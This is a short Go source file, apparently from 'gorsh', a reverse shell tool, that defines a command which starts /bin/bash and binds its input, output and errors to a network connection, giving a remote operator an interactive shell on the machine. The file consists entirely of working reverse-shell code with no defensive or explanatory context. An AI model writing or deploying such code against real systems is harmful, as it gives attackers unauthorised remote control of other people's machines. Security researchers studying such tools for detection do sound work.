package cmds

import (
	"os/exec"

	"github.com/abiosoft/ishell"

	"github.com/audibleblink/gorsh/internal/myconn"
)

func Cli(c *ishell.Context) {
	var cmd *exec.Cmd

	cmd = exec.Command("/bin/bash")
	cmd.Stdout = myconn.Conn
	cmd.Stderr = myconn.Conn
	cmd.Stdin = myconn.Conn
	cmd.Run()

}
